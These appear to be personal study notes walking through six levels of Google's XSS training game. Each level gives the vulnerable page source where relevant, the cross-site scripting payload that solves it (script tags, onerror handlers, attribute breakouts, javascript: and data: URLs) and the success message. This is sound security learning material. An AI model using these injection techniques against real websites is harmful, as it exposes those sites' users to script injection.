# 1 - Hello, world of XSS
## Mission Description
This level demonstrates a common cause of cross-site scripting where user input is directly included in the page without proper escaping.  
## Mission Objective
* Inject a script to pop up a JavaScript `alert()` in the frame below.  
## Practical
![[Pasted image 20250106230902.png]]
We enter this XSS Payload into the query: `<script>alert()</script>`, and we get the following message:
```txt
Congratulations, you executed an alert:

undefined

You can now advance to the next level.
```
# 2 - Persistence is key
## Mission Description
Web applications often keep user data in server-side and, increasingly, client-side databases and later display it to users. No matter where such user-controlled data comes from, it should be handled carefully.  
## Mission Objective
* Inject a script to pop up an `alert()` in the context of the application.  
**Note**: the application saves your posts so if you sneak in code to execute the alert, this level will be solved every time you reload it.
## Practical
![[Pasted image 20250106231216.png]]
We enter this payload `<img src="" onerror=alert()>` (see [[HTML - AIO - TODO#HTML Events#onerror| HTML onerror]]) into our post, and we get the following message:
```txt
Congratulations, you executed an alert:

undefined

You can now advance to the next level.
```
# 3 - That sinking feeling.
## Mission Description
As you've seen in the previous level, some common **JS functions** are _execution sinks_ which means that **they will cause the browser to execute any scripts that appear in their input**. Sometimes this fact is hidden by higher-level APIs which use one of these functions under the hood.  
  
The application on this level is using one such hidden sink.
## Mission Objective
* Inject a script to pop up a JavaScript `alert()` in the app.  
* Since you can't enter your payload anywhere in the application, you will have to manually edit the address in the URL bar below.
## Practical
![[Pasted image 20250106231405.png]]
If we examine the source code we can see this:
```html
 <script>
      function chooseTab(num) {
        // Dynamically load the appropriate image.
        var html = "Image " + parseInt(num) + "<br>";
        html += "<img src='/static/level3/cloud" + num + ".jpg' />";
        $('#tabContent').html(html);
...SNIP...
```
Here, we see this line `"<img src='/static/level3/cloud" + num + ".jpg' />"`. As it starts the ``<img>`` script with `"`, and the `.jpg` part ends in `'`, we can escape it with this payload:
```html
https://xss-game.appspot.com/level3/frame#1"'<img src="" onerror=alert(1)>
```
And we get this:
```txt
Congratulations, you executed an alert:

1

You can now advance to the next level.
```
# 4 - Context Matters
## Mission Description
Every bit of user-supplied data must be correctly escaped for the context of the page in which it will appear. This level shows why.
## Mission Objective
* Inject a script to pop up a JavaScript `alert()` in the application.
## Practical
This is our target site:
![[Pasted image 20250107175613.png]]
With the source code, we can see this function and how it's used:
```html
   <script>
      function startTimer(seconds) {
        seconds = parseInt(seconds) || 3;
        setTimeout(function() { 
          window.confirm("Time is up!");
          window.history.back();
        }, seconds * 1000);
      }
    </script>
  </head>
  <body id="level4">
    <img src="/static/logos/level4.png"/>
    <br>
    <img src="/static/loading.gif" onload="startTimer('3');" />
    <br>
    <div id="message">Your timer will execute in 3 seconds.</div>
```
To escape the it we can use this payload:
```html
1');alert(')
```
Where the source ends up looking like this:
```html
...SNIP..
    <img src="/static/loading.gif" onload="startTimer('1&#39;);alert(&#39;)');"/>
    <br>
    <div id="message">Your timer will execute in 1&#39;);alert(&#39;) seconds.
...SNIP...
```
And we get this:
```txt
Congratulations, you executed an alert:
)
You can now advance to the next level.
```
# 5 - Breaking Protocol
## Mission Description
Cross-site scripting isn't _just_ about correctly escaping data. Sometimes, attackers can do bad things even without injecting new elements into the DOM.
## Mission Objective
* Inject a script to pop up an `alert()` in the context of the application.
## Practical
This is our target site:
![[Pasted image 20250107175947.png]]
When we go to sign up, and check the source code, we can see a `href` attribute and how it changes when we modify the URL:
```html
<!--- If we change the url from 
..SNIP.../level5/frame/signup?next=confirm
TO
..SNIP.../level5/frame/signup?next=a
The source code looks like this
--->
...SNIP...
<!-- We're ignoring the email, but the poor user will never know! -->
Enter email: <input id="reader-email" name="email" value="">
<br>
<br>
<a href="a">Next >>
</a>
  </body>
</html>
```
So now if we modify the URL into the payload below, we should get an XSS if we press the `Next` button:
```html
javascript:alert(1)
```
And we get this:
```txt
Congratulations, you executed an alert:
1
You can now advance to the next level.
```
# 6 - Follow the Rabbit
## Mission Description
Complex web apps sometimes have the capability to **dynamically load** JavaScript libraries based on the **value of their URL** parameters or part of `location.hash`.  
  
This is very tricky to get right -- allowing user input to influence the URL when loading scripts or other potentially dangerous types of data such as `XMLHttpRequest` often leads to serious vulnerabilities.
## Mission Objective
* Find a way to _make the application request an external file_ which will cause it to execute an `alert()`.
## Practical
This is our target site:
![[Pasted image 20250107181357.png]]
We can check the source code, and how the gadget loading works:
```js
	function setInnerText(element, value) {
      if (element.innerText) {
        element.innerText = value;
      } else {
        element.textContent = value;
      }
    }
	function includeGadget(url) {
      var scriptEl = document.createElement('script');
      // This will totally prevent us from loading evil URLs!
      if (url.match(/^https?:\/\//)) {
        setInnerText(document.getElementById("log"),
          "Sorry, cannot load a URL containing \"http\".");
        return;
      }
      // Load this awesome gadget
      scriptEl.src = url;
      // Show log messages
      scriptEl.onload = function() { 
        setInnerText(document.getElementById("log"),  
          "Loaded gadget from " + url);
      }
      scriptEl.onerror = function() { 
        setInnerText(document.getElementById("log"),  
          "Couldn't load gadget from " + url);
      }
      document.head.appendChild(scriptEl);
    }
    // Take the value after # and use it as the gadget filename.
    function getGadgetName() { 
      return window.location.hash.substr(1) || "/static/gadget.js";
    }
    includeGadget(getGadgetName());
    // Extra code so that we can communicate with the parent page
    window.addEventListener("message", function(event){
      if (event.source == parent) {
        includeGadget(getGadgetName());
      }
    }, false);
```
So now if we modify the URL into the payload below:
```html
..SNIP../level6/frame#data:text/plain,alert()
```
We should get this:
```txt
Congratulations, you executed an alert:
undefined
You can now advance to the next level.
